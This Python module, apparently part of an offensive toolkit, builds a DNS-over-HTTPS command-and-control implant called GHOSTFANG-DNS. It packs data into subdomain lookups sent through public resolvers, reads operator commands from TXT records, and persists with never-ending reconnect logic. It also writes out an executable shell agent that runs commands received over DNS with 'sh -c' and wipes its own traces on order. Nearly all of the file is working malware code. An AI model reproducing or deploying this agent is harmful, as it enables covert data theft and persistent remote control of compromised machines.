"""quantum.c2.agents.ghostdns — GHOSTFANG-DNS DoH-egress agent + tasking.

Hardened for aggressive/persistent reverse connections: exponential backoff
with jitter, on-disk session state, bidirectional health (egress beacon AND
task poll must both succeed before the failure counter resets), and
multi-resolver rotation inherited from quantum.recon.doh.
"""
from __future__ import annotations

import base64
import json
import os
import random
import time

from quantum.core.env import QCLI_DIR
from quantum.core.logging import log
from quantum.recon.doh import DoH


def doh_reverse_beacon(host_id, data, domain):
    """Implant-side reverse-DoH egress: beacon data rides as subdomain labels
    encrypted base32 through public DoH resolvers (443/tcp), reaching a web-app
    or authoritative DNS capture point. NO inbound ports required — the implant
    only ever makes outbound lookups that look like cache-miss DNS."""
    if isinstance(data, str):
        data = data.encode("utf-8")
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    chunks = [b32[i:i+60] for i in range(0, len(b32), 60)]
    try:
        for b in chunks:
            info = f"{host_id}.{b}.{domain}"
            _ = DoH().resolve(info[:253], rtype="A")
        return {"beacon_bytes": len(data), "chunks": len(chunks)}
    except Exception as e:
        log(f"doh_reverse_beacon: {e}", "WARN")
        return {"error": str(e)}


def doh_task_check(domain, host_id="hq", errors="swallow"):
    """HQ-side: read next command from operator-controlled DNS TXT records.
    Set the TXT record at `{host_id}.cmd.{domain}` OR `cmd.{domain}`.
    Returns the task dict or None. This is how implants stay tasked even with
    no inbound C2 — public resolvers only see benign recursive lookups.

    errors="raise" lets callers distinguish 'no task waiting' (None) from
    'resolver outage' (exception) — used by PersistentDoHChannel to drive
    its backoff; the default "swallow" keeps the original behavior."""
    try:
        for name in (f"{host_id}.cmd.{domain}", f"cmd.{domain}"):
            answers = DoH().resolve(name, rtype="TXT")
            for ans in answers:
                try:
                    raw = ans.get("data", "").strip('"')
                    if raw.startswith("{"):
                        return json.loads(raw)
                except Exception:
                    continue
    except Exception as e:
        if errors == "raise":
            raise
        log(f"doh_task_check: {e}", "WARN")
    return None


def backoff_seconds(attempt, base=2.0, cap=300.0, rand=None):
    """Exponential backoff with jitter: base * 2^(attempt-1) capped at [cap],
    scaled into [50%, 100%] by rand() in [0,1] (half-jitter so retries never
    synchronize). Pure function — unit-tested."""
    r = rand if rand is not None else random.random
    exp = min(float(cap), float(base) * (2.0 ** max(0, attempt - 1)))
    return max(0.5, exp * (0.5 + 0.5 * r()))


class PersistentDoHChannel:
    """Bidirectional persistent DoH C2 channel with aggressive reconnect.

    Every cycle:
      OUT — egress data rides DoH subdomain lookups (doh_reverse_beacon)
      IN  — next task is polled from TXT records (doh_task_check, errors=raise)
    Both directions must succeed for the cycle to count as healthy; failures
    accumulate an attempt counter that drives exponential backoff with jitter,
    and the session state (attempt, counters, last-seen) is persisted to disk
    so a restarted process resumes instead of hammering from zero. The channel
    NEVER gives up — it only sleeps longer between tries.

    Verification scope (honest): retry/backoff/state logic is unit-tested
    against fakes; end-to-end operation against a live DoH resolver and an
    authoritative TXT drop still needs a live target.
    """

    def __init__(self, host_id, domain, interval=60.0, max_backoff=300.0,
                 state_file=None):
        self.host_id = host_id
        self.domain = domain
        self.interval = float(interval)
        self.max_backoff = float(max_backoff)
        self.state_file = state_file or os.path.join(QCLI_DIR, "dohlink_state.json")
        self._state = self._load()

    # ------------------------------------------------------------- state
    def _load(self):
        try:
            with open(self.state_file, encoding="utf-8") as fh:
                st = json.load(fh)
            if isinstance(st, dict):
                return st
        except Exception:
            pass
        return {"attempt": 0, "cycles": 0, "fails": 0,
                "last_ok": None, "last_fail": None, "last_task": None}

    def _save(self):
        try:
            os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
            tmp = self.state_file + ".tmp"
            with open(tmp, "w", encoding="utf-8") as fh:
                json.dump(self._state, fh)
            os.replace(tmp, self.state_file)
        except Exception as e:
            log(f"PersistentDoHChannel state save failed: {e}", "WARN")

    @property
    def state(self):
        """Session state snapshot (attempt counter, counters, last-seen)."""
        return dict(self._state)

    # ------------------------------------------------------------- cycle
    def cycle(self, data=None):
        """One bidirectional pass; returns a JSON-ready status dict including
        the sleep the caller should honor before the next cycle."""
        out = {"ts": time.time(), "ok": False}
        ok = True

        if data is not None:
            res = doh_reverse_beacon(self.host_id, data, self.domain)
            out["egress"] = res
            ok = "error" not in res

        try:
            task = doh_task_check(self.domain, self.host_id, errors="raise")
            out["task"] = task
            self._state["last_task"] = task
        except Exception as e:
            out["task_error"] = str(e)
            ok = False

        if ok:
            self._state["attempt"] = 0
            self._state["cycles"] = int(self._state.get("cycles", 0)) + 1
            self._state["last_ok"] = out["ts"]
        else:
            self._state["attempt"] = int(self._state.get("attempt", 0)) + 1
            self._state["fails"] = int(self._state.get("fails", 0)) + 1
            self._state["last_fail"] = out["ts"]

        out["ok"] = ok
        out["attempt"] = self._state["attempt"]
        out["sleep"] = (
            self.interval if ok
            else backoff_seconds(self._state["attempt"], base=2.0,
                                 cap=self.max_backoff)
        )
        self._save()
        if not ok:
            log(f"PersistentDoHChannel: cycle failed (attempt "
                f"{self._state['attempt']}) — retry in {out['sleep']:.1f}s", "WARN")
        return out

    def run(self, data_fn=None, max_cycles=None, sleep_fn=time.sleep,
            stop_fn=None):
        """Persistent loop: egress payload (if data_fn given) + task poll every
        cycle, sleeping interval on success and backoff on failure. Returns the
        last cycle status when max_cycles/stop_fn ends the loop; runs forever
        otherwise. Injectable sleep/stop for tests."""
        cycles = 0
        last = None
        while True:
            if stop_fn is not None and stop_fn():
                return last
            data = data_fn() if data_fn is not None else None
            last = self.cycle(data)
            cycles += 1
            if max_cycles is not None and cycles >= max_cycles:
                return last
            sleep_fn(last["sleep"])


def generate_dns_agent(domain, interval=60):
    """GHOSTFANG-DNS: the no-port-forward POSIX/Linux agent. Beacon exfil via
    DoH label encoding; command intake via DNS TXT. Survives outbound-only
    firewall policies (all traffic is 443/tcp to 1.1.1.1/8.8.8.8)."""
    script = f"""#!/bin/sh
# GHOSTFANG-DNS {int(time.time())} — DoH-egress agent (no inbound ports needed)
QD="{domain}"
HOST="$(hostname 2>/dev/null || echo dns-$(id -u))"
ID=$(echo -n "$HOST" | head -c 12 | tr -c 'a-z0-9' 'x')
b32() {{ dd bs=1 count=$1 2>/dev/null | base64 | tr -d '\\n' | tr '+' '-' | tr '/' '_'; }}
beacon() {{
  curl -s -m 10 -H 'accept: application/dns-json' \\
    "https://cloudflare-dns.com/dns-query?name=$ID.$(echo ok|b32 2).$QD&type=A" >/dev/null 2>&1 || \\
  curl -s -m 10 "https://dns.google/resolve?name=$ID.$QD&type=A" >/dev/null 2>&1
}}
task() {{
  curl -s -m 10 "https://dns.google/resolve?name=cmd.$QD&type=TXT" 2>/dev/null | \\
    grep -o '"data":"[^"]*"' | head -1 | cut -d'"' -f4
}}
while :; do
  if beacon; then FAIL=0; else FAIL=$((FAIL+1)); fi
  T=$(task | tr -d '"' | tr -d '\\\\')
  case "$T" in
    *'"'*'}}'*) C=$(echo "$T" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p'); [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &) ;;
    wipe) rm -f /var/tmp/.gn-* ~/.qcli* ;; kill) rm -f /var/tmp/.gn-*; kill $$ ;;
  esac
  # aggressive/persistent reconnect: failures retry fast (5s * attempts,
  # capped at the normal interval and 300s); success holds the interval.
  if [ "$FAIL" -gt 0 ]; then
    S=$(( FAIL * 5 )); [ "$S" -gt {interval} ] && S={interval}
    [ "$S" -gt 300 ] && S=300
    sleep "$S"
  else
    sleep {interval}
  fi
done
"""
    fn = os.path.join(QCLI_DIR, "ghostdns.sh")
    open(fn, "w").write(script)
    try: os.chmod(fn, 0o755)
    except OSError as e: log(f"ghostdns.sh chmod failed: {e}", "WARN")
    log(f"GHOSTFANG-DNS agent generated -> ghostdns.sh (domain {domain})", "C2")
    return fn
